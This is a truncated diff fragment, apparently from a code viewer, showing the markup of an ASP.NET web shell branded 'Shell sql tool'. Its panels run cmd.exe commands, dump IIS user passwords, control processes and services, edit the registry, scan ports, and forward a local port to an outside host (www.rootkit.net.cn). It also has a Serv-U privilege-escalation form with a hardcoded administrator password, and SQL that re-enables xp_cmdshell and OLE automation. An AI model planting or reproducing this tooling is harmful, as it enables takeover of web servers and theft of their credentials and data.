[bin_cmd];"&gt;DatabaseBackup&lt;/asp:ListItem&gt;&lt;/asp:DropDownList&gt;
-&lt;/div&gt;
-&lt;table width="200" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td&gt; Run SQL &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;textarea id="jHIy" class="area" style="width:600px;height:60px;overflow:auto;" runat="server" rows="6" cols="1"&gt;&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;
-&lt;asp:Button runat="server" ID="WOhJ" CssClass="bt" Text="Query" onclick="ORUgV"/&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;div style="overflow-x:auto;width:950px" &gt;
-&lt;p&gt;
-&lt;asp:DataGrid runat="server" ID="rom" HeaderStyle-CssClass="head" BorderWidth="0" GridLines="None" &gt;&lt;/asp:DataGrid&gt;
-&lt;/p&gt;
-&lt;/div&gt;
-&lt;/div&gt;
-&lt;/div&gt;
-&lt;%--PortMap--%&gt;
-&lt;div id="hOWTm" runat="server"&gt;
-&lt;table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;"&gt;
-&lt;tr align="center"&gt;
-&lt;td style="width:5%"&gt;&lt;/td&gt;
-&lt;td style="width:20%" align="left"&gt;Local Ip : &lt;input class="input" runat="server" id="eEpm" type="text" size="20" value="127.0.0.1"/&gt;&lt;/td&gt;
-&lt;td style="width:20%" align="left"&gt;Local Port : &lt;input class="input" runat="server" id="iXdh" type="text" size="20" value="3389"/&gt;&lt;/td&gt;
-&lt;td style="width:20%" align="left"&gt;Remote Ip : &lt;input class="input" runat="server" id="llH" type="text" size="20" value="www.rootkit.net.cn"/&gt;&lt;/td&gt;
-&lt;td style="width:20%" align="left"&gt;Remote Port : &lt;input class="input" runat="server" id="ZHS" type="text" size="20" value="80"/&gt;&lt;/td&gt;&lt;/tr&gt;
-&lt;tr align="center"&gt;&lt;td colspan="5"&gt;&lt;br/&gt;&lt;asp:Button ID="FJE" CssClass="bt" runat="server" Text="MapPort" OnClick="wDZ"/&gt; &lt;asp:Button ID="giX" CssClass="bt" runat="server" Text="ClearAll" OnClick="vJNsE"/&gt; &lt;asp:Button ID="GFsm" CssClass="bt" runat="server" Text="Refresh" OnClick="tYoZ"/&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;
-&lt;%--Search--%&gt;
-&lt;div id="yhv" runat="server"&gt;
-&lt;table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;"&gt;
-&lt;tr align="center"&gt;
-&lt;td style="width:20%" align="left"&gt;Keyword&lt;/td&gt;
-&lt;td style="width:60%" align="left"&gt;&lt;textarea id="iaMKl" runat="server" class="area" style="width:100%" rows="4"&gt;&lt;/textarea&gt;&lt;/td&gt;
-&lt;td style="width:20%" align="left"&gt;&lt;input type="checkbox" runat="server" id="rAQ" value="1"/&gt; Use Regex&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr align="center"&gt;
-&lt;td style="width:20%" align="left"&gt;Replace As&lt;/td&gt;
-&lt;td style="width:60%" align="left"&gt;&lt;textarea id="qPe" runat="server" class="area" style="width:100%" rows="4"&gt;&lt;/textarea&gt;&lt;/td&gt;
-&lt;td style="width:20%" align="left"&gt;&lt;input type="checkbox" runat="server" id="YZw"/&gt; Replace&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr align="center"&gt;
-&lt;td style="width:20%" align="left"&gt;Search FileType&lt;/td&gt;
-&lt;td style="width:60%" align="left"&gt;&lt;input type="text" runat="server" class="input" id="UDLvA" style="width:100%" value="asp|asa|cer|cdx|aspx|asax|ascx|cs|jsp|php|txt|inc|ini|js|htm|html|xml|config"/&gt;&lt;/td&gt;
-&lt;td style="width:20%" align="left"&gt;&lt;asp:DropDownList runat="server" ID="Ven" AutoPostBack="False" CssClass="list"&gt;&lt;asp:ListItem Value="name"&gt;File Name&lt;/asp:ListItem&gt;&lt;asp:ListItem Value="content" Selected="True"&gt;File Content&lt;/asp:ListItem&gt;&lt;/asp:DropDownList&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr align="center"&gt;
-&lt;td style="width:20%" align="left"&gt;Path&lt;/td&gt;
-&lt;td style="width:60%" align="left"&gt;&lt;input type="text" class="input" id="NaLJ" runat="server" style="width:100%" /&gt;&lt;/td&gt;
-&lt;td style="width:20%" align="left"&gt;&lt;asp:Button CssClass="bt" id="axy" runat="server" onclick="NBy" Text="Start" /&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/table&gt;
-&lt;br/&gt;
-&lt;br/&gt;
-&lt;asp:Table ID="oJiym" runat="server" Width="100%" CellSpacing="0" &gt;
-&lt;asp:TableRow CssClass="head"&gt;&lt;asp:TableCell Width="60%"&gt;File Path&lt;/asp:TableCell&gt;&lt;asp:TableCell Width="20%"&gt;Last modified&lt;/asp:TableCell&gt;&lt;asp:TableCell Width="20%"&gt;Size&lt;/asp:TableCell&gt;&lt;/asp:TableRow&gt;
-&lt;/asp:Table&gt;
-&lt;/div&gt;
-&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;"&gt;Copyright &copy; 2006-2009 &lt;a href="http://alikaptanoglu.blogspot.com" target="_blank"&gt;Shell sql tool&lt;/a&gt; All Rights Reserved.&lt;/div&gt;&lt;/div&gt;
-&lt;/form&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</pre>
+<span class="ni">&amp;lt;</span>input class=&quot;input&quot; id=&quot;aLsn&quot; type=&quot;text&quot; runat=&quot;server&quot;/<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/p<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>p<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>asp:Button ID=&quot;kOG&quot; CssClass=&quot;bt&quot; runat=&quot;server&quot; Text=&quot;Submit&quot; OnClick=&quot;tIykC&quot;/<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/p<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/div<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>%--IISSpy--%<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>div runat=&quot;server&quot; id=&quot;VNR&quot; visible=&quot;false&quot; enableviewstate=&quot;false&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;4&quot; cellspacing=&quot;0&quot; style=&quot;margin:10px 0;&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>asp:Table ID=&quot;GlI&quot; runat=&quot;server&quot; Width=&quot;100%&quot; CellSpacing=&quot;0&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>asp:TableRow CssClass=&quot;head&quot;<span class="ni">&amp;gt;&amp;lt;</span>asp:TableCell<span class="ni">&amp;gt;</span>ID<span class="ni">&amp;lt;</span>/asp:TableCell<span class="ni">&amp;gt;&amp;lt;</span>asp:TableCell<span class="ni">&amp;gt;</span>IIS_USER<span class="ni">&amp;lt;</span>/asp:TableCell<span class="ni">&amp;gt;&amp;lt;</span>asp:TableCell<span class="ni">&amp;gt;</span>IIS_PASS<span class="ni">&amp;lt;</span>/asp:TableCell<span class="ni">&amp;gt;&amp;lt;</span>asp:TableCell<span class="ni">&amp;gt;</span>Domain<span class="ni">&amp;lt;</span>/asp:TableCell<span class="ni">&amp;gt;&amp;lt;</span>asp:TableCell<span class="ni">&amp;gt;</span>Path<span class="ni">&amp;lt;</span>/asp:TableCell<span class="ni">&amp;gt;&amp;lt;</span>/asp:TableRow<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/asp:Table<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/table<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/div<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>%--Process--%<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>div runat=&quot;server&quot; id=&quot;DCbS&quot; visible=&quot;false&quot; enableviewstate=&quot;false&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;4&quot; cellspacing=&quot;0&quot; style=&quot;margin:10px 0;&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>asp:Table ID=&quot;IjsL&quot; runat=&quot;server&quot; Width=&quot;100%&quot; CellSpacing=&quot;0&quot; <span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>asp:TableRow CssClass=&quot;head&quot;<span class="ni">&amp;gt;&amp;lt;</span>asp:TableCell<span class="ni">&amp;gt;&amp;lt;</span>/asp:TableCell<span class="ni">&amp;gt;&amp;lt;</span>asp:TableCell<span class="ni">&amp;gt;</span>ID<span class="ni">&amp;lt;</span>/asp:TableCell<span class="ni">&amp;gt;&amp;lt;</span>asp:TableCell<span class="ni">&amp;gt;</span>Process<span class="ni">&amp;lt;</span>/asp:TableCell<span class="ni">&amp;gt;&amp;lt;</span>asp:TableCell<span class="ni">&amp;gt;</span>ThreadCount<span class="ni">&amp;lt;</span>/asp:TableCell<span class="ni">&amp;gt;&amp;lt;</span>asp:TableCell<span class="ni">&amp;gt;</span>Priority<span class="ni">&amp;lt;</span>/asp:TableCell<span class="ni">&amp;gt;&amp;lt;</span>asp:TableCell<span class="ni">&amp;gt;</span>Action<span class="ni">&amp;lt;</span>/asp:TableCell<span class="ni">&amp;gt;&amp;lt;</span>/asp:TableRow<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/asp:Table<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/table<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/div<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>%--CmdShell--%<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>div runat=&quot;server&quot; id=&quot;vIac&quot;<span class="ni">&amp;gt;</span>
+ <span class="ni">&amp;lt;</span>p<span class="ni">&amp;gt;</span>CmdPath:<span class="ni">&amp;lt;</span>br/<span class="ni">&amp;gt;</span>
+ <span class="ni">&amp;lt;</span>input class=&quot;input&quot; runat=&quot;server&quot; id=&quot;kusi&quot; type=&quot;text&quot; size=&quot;100&quot; value=&quot;c:\windows\system32\cmd.exe&quot;/<span class="ni">&amp;gt;</span>
+ <span class="ni">&amp;lt;</span>/p<span class="ni">&amp;gt;</span>
+ Argument:<span class="ni">&amp;lt;</span>br/<span class="ni">&amp;gt;</span>
+ <span class="ni">&amp;lt;</span>input class=&quot;input&quot; runat=&quot;server&quot; id=&quot;bkcm&quot; value=&quot;/c Set&quot; type=&quot;text&quot; size=&quot;100&quot;/<span class="ni">&amp;gt;</span> <span class="ni">&amp;lt;</span>asp:Button ID=&quot;YrqL&quot; CssClass=&quot;bt&quot; runat=&quot;server&quot; Text=&quot;Submit&quot; OnClick=&quot;FbhN&quot;/<span class="ni">&amp;gt;</span>
+ <span class="ni">&amp;lt;</span>div id=&quot;tnQRF&quot; runat=&quot;server&quot; visible=&quot;false&quot; enableviewstate=&quot;false&quot;<span class="ni">&amp;gt;</span>
+ <span class="ni">&amp;lt;</span>/div<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/div<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>%--Services--%<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>div runat=&quot;server&quot; id=&quot;iQxm&quot; visible =&quot;false&quot; enableviewstate=&quot;false&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;4&quot; cellspacing=&quot;0&quot; style=&quot;margin:10px 0;&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>asp:Table ID=&quot;vHCs&quot; runat=&quot;server&quot; Width=&quot;100%&quot; CellSpacing=&quot;0&quot; <span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>asp:TableRow CssClass=&quot;head&quot;<span class="ni">&amp;gt;&amp;lt;</span>asp:TableCell<span class="ni">&amp;gt;&amp;lt;</span>/asp:TableCell<span class="ni">&amp;gt;&amp;lt;</span>asp:TableCell<span class="ni">&amp;gt;</span>ID<span class="ni">&amp;lt;</span>/asp:TableCell<span class="ni">&amp;gt;&amp;lt;</span>asp:TableCell<span class="ni">&amp;gt;</span>Name<span class="ni">&amp;lt;</span>/asp:TableCell<span class="ni">&amp;gt;&amp;lt;</span>asp:TableCell<span class="ni">&amp;gt;</span>Path<span class="ni">&amp;lt;</span>/asp:TableCell<span class="ni">&amp;gt;&amp;lt;</span>asp:TableCell<span class="ni">&amp;gt;</span>State<span class="ni">&amp;lt;</span>/asp:TableCell<span class="ni">&amp;gt;&amp;lt;</span>asp:TableCell<span class="ni">&amp;gt;</span>StartMode<span class="ni">&amp;lt;</span>/asp:TableCell<span class="ni">&amp;gt;&amp;lt;</span>/asp:TableRow<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/asp:Table<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/table<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/div<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>%--Sysinfo--%<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>div runat=&quot;server&quot; id=&quot;ghaB&quot; visible=&quot;false&quot; enableviewstate=&quot;false&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>hr style=&quot; border: 1px solid #ddd;height:0px;&quot;/<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>ul class=&quot;info&quot; id=&quot;Bin_Ul_Sys&quot; runat=&quot;server&quot;<span class="ni">&amp;gt;&amp;lt;</span>/ul<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>h2 id=&quot;Bin_H2_Mac&quot; runat=&quot;server&quot;<span class="ni">&amp;gt;&amp;lt;</span>/h2<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>hr style=&quot; border: 1px solid #ddd;height:0px;&quot;/<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>ul class=&quot;info&quot; id =&quot;Bin_Ul_NetConfig&quot; runat=&quot;server&quot;<span class="ni">&amp;gt;&amp;lt;</span>/ul<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>h2 id=&quot;Bin_H2_Driver&quot; runat=&quot;server&quot;<span class="ni">&amp;gt;&amp;lt;</span>/h2<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>hr style=&quot; border: 1px solid #ddd;height:0px;&quot;/<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>ul class=&quot;info&quot; id =&quot;Bin_Ul_Driver&quot; runat=&quot;server&quot;<span class="ni">&amp;gt;&amp;lt;</span>/ul<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/div<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>%--UserInfo--%<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>div runat=&quot;server&quot; id=&quot;xWVQ&quot; visible=&quot;false&quot; enableviewstate=&quot;false&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;4&quot; cellspacing=&quot;0&quot; style=&quot;margin:10px 0;&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>asp:Table ID=&quot;VPa&quot; runat=&quot;server&quot; Width=&quot;100%&quot; CellSpacing=&quot;0&quot; <span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/asp:Table<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/table<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/div<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>%--SuExp--%<span class="ni">&amp;gt;</span>
+ <span class="ni">&amp;lt;</span>div runat=&quot;server&quot; id=&quot;APl&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;4&quot; cellspacing=&quot;0&quot; style=&quot;margin:10px 0;&quot;<span class="ni">&amp;gt;</span>
+ <span class="ni">&amp;lt;</span>tr align=&quot;center&quot;<span class="ni">&amp;gt;</span>
+ <span class="ni">&amp;lt;</span>td style=&quot;width:10%&quot;<span class="ni">&amp;gt;&amp;lt;</span>/td<span class="ni">&amp;gt;</span>
+ <span class="ni">&amp;lt;</span>td style=&quot;width:20%&quot; align=&quot;left&quot;<span class="ni">&amp;gt;</span>UserName : <span class="ni">&amp;lt;</span>input class=&quot;input&quot; runat=&quot;server&quot; id=&quot;dNohJ&quot; type=&quot;text&quot; size=&quot;20&quot; value=&quot;localadministrator&quot;/<span class="ni">&amp;gt;&amp;lt;</span>/td<span class="ni">&amp;gt;</span>
+ <span class="ni">&amp;lt;</span>td style=&quot;width:20%&quot; align=&quot;left&quot;<span class="ni">&amp;gt;</span>PassWord : <span class="ni">&amp;lt;</span>input class=&quot;input&quot; runat=&quot;server&quot; id=&quot;NMd&quot; type=&quot;text&quot; size=&quot;20&quot; value=&quot;#l@$ak#.lk;0@P&quot;/<span class="ni">&amp;gt;&amp;lt;</span>/td<span class="ni">&amp;gt;</span>
+ <span class="ni">&amp;lt;</span>td style=&quot;width:20%&quot; align=&quot;left&quot;<span class="ni">&amp;gt;</span>Port : <span class="ni">&amp;lt;</span>input class=&quot;input&quot; runat=&quot;server&quot; id=&quot;HlQl&quot; type=&quot;text&quot; size=&quot;20&quot; value=&quot;43958&quot;/<span class="ni">&amp;gt;&amp;lt;</span>/td<span class="ni">&amp;gt;</span>
+ <span class="ni">&amp;lt;</span>td style=&quot;width:10%&quot;<span class="ni">&amp;gt;&amp;lt;</span>/td<span class="ni">&amp;gt;</span>
+ <span class="ni">&amp;lt;</span>/tr<span class="ni">&amp;gt;</span>
+ <span class="ni">&amp;lt;</span>tr <span class="ni">&amp;gt;</span>
+ <span class="ni">&amp;lt;</span>td style=&quot;width:10%&quot;<span class="ni">&amp;gt;&amp;lt;</span>/td<span class="ni">&amp;gt;</span>
+ <span class="ni">&amp;lt;</span>td colspan=&quot;5&quot;<span class="ni">&amp;gt;</span>CmdShell<span class="ni">&amp;nbsp;&amp;nbsp;</span>:<span class="ni">&amp;nbsp;&amp;lt;</span>input class=&quot;input&quot; runat=&quot;server&quot; id=&quot;mHbjB&quot; type=&quot;text&quot; size=&quot;100&quot; value=&quot;cmd.exe /c net user&quot;/<span class="ni">&amp;gt;</span> <span class="ni">&amp;lt;</span>asp:Button ID=&quot;SPhc&quot; CssClass=&quot;bt&quot; runat=&quot;server&quot; Text=&quot;Exploit&quot; OnClick=&quot;lRfRj&quot;/<span class="ni">&amp;gt;&amp;lt;</span>/td<span class="ni">&amp;gt;</span>
+ <span class="ni">&amp;lt;</span>/tr<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/table<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>div id=&quot;UHlA&quot; visible=&quot;false&quot; enableviewstate=&quot;false&quot; runat=&quot;server&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;4&quot; cellspacing=&quot;0&quot; style=&quot;margin:10px 0;&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>tr align=&quot;center&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>td style=&quot;width:30%&quot;<span class="ni">&amp;gt;&amp;lt;</span>/td<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>td align=&quot;left&quot; style=&quot;width:40%&quot;<span class="ni">&amp;gt;&amp;lt;</span>pre id=&quot;Bin_Td_Res&quot; runat=&quot;server&quot;<span class="ni">&amp;gt;&amp;lt;</span>/pre<span class="ni">&amp;gt;&amp;lt;</span>/td<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>td style=&quot;width:30%&quot;<span class="ni">&amp;gt;&amp;lt;</span>/td<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/tr<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/table<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/div<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/div<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>%--Reg--%<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>div id=&quot;kkHN&quot; runat=&quot;server&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>p<span class="ni">&amp;gt;</span>Registry Path : <span class="ni">&amp;lt;</span>asp:TextBox id=&quot;qPdI&quot; style=&quot;width:85%;margin:0 8px;&quot; CssClass=&quot;input&quot; runat=&quot;server&quot;/<span class="ni">&amp;gt;&amp;lt;</span>asp:Button ID=&quot;MoNA&quot; runat=&quot;server&quot; Text=&quot;Go&quot; CssClass=&quot;bt&quot; onclick=&quot;RAFL&quot;/<span class="ni">&amp;gt;&amp;lt;</span>/p<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; style=&quot;margin:10px 0;&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>asp:Table ID=&quot;pLWD&quot; runat=&quot;server&quot; Width=&quot;100%&quot; CellSpacing=&quot;0&quot; <span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>asp:TableRow CssClass=&quot;alt1&quot;<span class="ni">&amp;gt;&amp;lt;</span>asp:TableCell ColumnSpan=&quot;2&quot; id=&quot;vyX&quot;<span class="ni">&amp;gt;&amp;lt;</span>/asp:TableCell<span class="ni">&amp;gt;&amp;lt;</span>/asp:TableRow<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>asp:TableRow CssClass=&quot;head&quot;<span class="ni">&amp;gt;&amp;lt;</span>asp:TableCell Width=&quot;40%&quot;<span class="ni">&amp;gt;</span>Key<span class="ni">&amp;lt;</span>/asp:TableCell<span class="ni">&amp;gt;&amp;lt;</span>asp:TableCell Width=&quot;60%&quot;<span class="ni">&amp;gt;</span>Value<span class="ni">&amp;lt;</span>/asp:TableCell<span class="ni">&amp;gt;&amp;lt;</span>/asp:TableRow<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/asp:Table<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/table<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/div<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>%--PortScan--%<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>div id=&quot;YwLB&quot; runat=&quot;server&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>p<span class="ni">&amp;gt;</span>
+IP : <span class="ni">&amp;lt;</span>asp:TextBox id=&quot;MdR&quot; style=&quot;width:10%;margin:0 8px;&quot; CssClass=&quot;input&quot; runat=&quot;server&quot; Text=&quot;127.0.0.1&quot;/<span class="ni">&amp;gt;</span> Port : <span class="ni">&amp;lt;</span>asp:TextBox id=&quot;lOmX&quot; style=&quot;width:40%;margin:0 8px;&quot; CssClass=&quot;input&quot; runat=&quot;server&quot; Text=&quot;21,25,80,110,1433,1723,3306,3389,4899,5631,43958,65500&quot;/<span class="ni">&amp;gt;</span> <span class="ni">&amp;lt;</span>asp:Button ID=&quot;CmUCh&quot; runat=&quot;server&quot; Text=&quot;Scan&quot; CssClass=&quot;bt&quot; OnClick=&quot;ELkQ&quot;/<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/p<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>div id=&quot;GBYT&quot; runat=&quot;server&quot; visible=&quot;false&quot; enableviewstate=&quot;false&quot;<span class="ni">&amp;gt;&amp;lt;</span>/div<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/div<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>%--DataBase--%<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>div id=&quot;iDgmL&quot; runat=&quot;server&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>p<span class="ni">&amp;gt;</span>ConnString : <span class="ni">&amp;lt;</span>asp:TextBox id=&quot;MasR&quot; style=&quot;width:70%;margin:0 8px;&quot; CssClass=&quot;input&quot; runat=&quot;server&quot;/<span class="ni">&amp;gt;&amp;lt;</span>asp:DropDownList runat=&quot;server&quot; CssClass=&quot;list&quot; ID=&quot;WYmo&quot; AutoPostBack=&quot;True&quot; OnSelectedIndexChanged=&quot;zOVO&quot; <span class="ni">&amp;gt;&amp;lt;</span>asp:ListItem<span class="ni">&amp;gt;&amp;lt;</span>/asp:ListItem<span class="ni">&amp;gt;&amp;lt;</span>asp:ListItem Value=&quot;server=localhost;UID=sa;PWD=;database=master;Provider=SQLOLEDB&quot;<span class="ni">&amp;gt;</span>MSSQL<span class="ni">&amp;lt;</span>/asp:ListItem<span class="ni">&amp;gt;&amp;lt;</span>asp:ListItem Value=&quot;Provider=Microsoft.Jet.OLEDB.4.0;Data Source=E:\database.mdb&quot;<span class="ni">&amp;gt;</span>ACCESS<span class="ni">&amp;lt;</span>/asp:ListItem<span class="ni">&amp;gt;&amp;lt;</span>/asp:DropDownList<span class="ni">&amp;gt;&amp;lt;</span>asp:Button ID=&quot;QcZPA&quot; runat=&quot;server&quot; Text=&quot;Go&quot; CssClass=&quot;bt&quot; OnClick=&quot;BGY&quot;/<span class="ni">&amp;gt;&amp;lt;</span>/p<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>div id=&quot;dQIIF&quot; runat=&quot;server&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>div id=&quot;irTU&quot; runat=&quot;server&quot;<span class="ni">&amp;gt;&amp;lt;</span>/div<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>div id=&quot;uXevN&quot; runat=&quot;server&quot;<span class="ni">&amp;gt;</span>
+Please select a database : <span class="ni">&amp;lt;</span>asp:DropDownList runat=&quot;server&quot; ID=&quot;Pvf&quot; AutoPostBack=&quot;True&quot; OnSelectedIndexChanged=&quot;zOVO&quot; CssClass=&quot;list&quot;<span class="ni">&amp;gt;&amp;lt;</span>/asp:DropDownList<span class="ni">&amp;gt;</span>
+SQLExec : <span class="ni">&amp;lt;</span>asp:DropDownList runat=&quot;server&quot; ID=&quot;FGEy&quot; AutoPostBack=&quot;True&quot; OnSelectedIndexChanged=&quot;zOVO&quot; CssClass=&quot;list&quot;<span class="ni">&amp;gt;&amp;lt;</span>asp:ListItem Value=&quot;&quot;<span class="ni">&amp;gt;</span>-- SQL Server Exec --<span class="ni">&amp;lt;</span>/asp:ListItem<span class="ni">&amp;gt;&amp;lt;</span>asp:ListItem Value=&quot;Use master dbcc addextendedproc(&#39;xp_cmdshell&#39;,&#39;xplog70.dll&#39;)&quot;<span class="ni">&amp;gt;</span>Add xp_cmdshell<span class="ni">&amp;lt;</span>/asp:ListItem<span class="ni">&amp;gt;&amp;lt;</span>asp:ListItem Value=&quot;Use master dbcc addextendedproc(&#39;sp_OACreate&#39;,&#39;odsole70.dll&#39;)&quot;<span class="ni">&amp;gt;</span>Add sp_oacreate<span class="ni">&amp;lt;</span>/asp:ListItem<span class="ni">&amp;gt;&amp;lt;</span>asp:ListItem Value=&quot;Exec sp_configure &#39;show advanced options&#39;,1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;,1;RECONFIGURE;&quot;<span class="ni">&amp;gt;</span>Add xp_cmdshell(SQL2005)<span class="ni">&amp;lt;</span>/asp:ListItem<span class="ni">&amp;gt;&amp;lt;</span>asp:ListItem Value=&quot;Exec sp_configure &#39;show advanced options&#39;,1;RECONFIGURE;exec sp_configure &#39;Ole Automation Procedures&#39;,1;RECONFIGURE;&quot;<span class="ni">&amp;gt;</span>Add sp_oacreate(SQL2005)<span class="ni">&amp;lt;</span>/asp:ListItem<span class="ni">&amp;gt;&amp;lt;</span>asp:ListItem Value=&quot;Exec sp_configure &#39;show advanced options&#39;,1;RECONFIGURE;exec sp_configure &#39;Web Assistant Procedures&#39;,1;RECONFIGURE;&quot;<span class="ni">&amp;gt;</span>Add makewebtask(SQL2005)<span class="ni">&amp;lt;</span>/asp:ListItem<span class="ni">&amp;gt;&amp;lt;</span>asp:ListItem Value=&quot;Exec sp_configure &#39;show advanced options&#39;,1;RECONFIGURE;exec sp_configure &#39;Ad Hoc Distributed Queries&#39;,1;RECONFIGURE;&quot;<span class="ni">&amp;gt;</span>Add openrowset/opendatasource(SQL2005)<span class="ni">&amp;lt;</span>/asp:ListItem<span class="ni">&amp;gt;&amp;lt;</span>asp:ListItem Value=&quot;Exec master.dbo.xp_cmdshell &#39;net user&#39;&quot;<span class="ni">&amp;gt;</span>XP_cmdshell exec<span class="ni">&amp;lt;</span>/asp:ListItem<span class="ni">&amp;gt;&amp;lt;</span>asp:ListItem 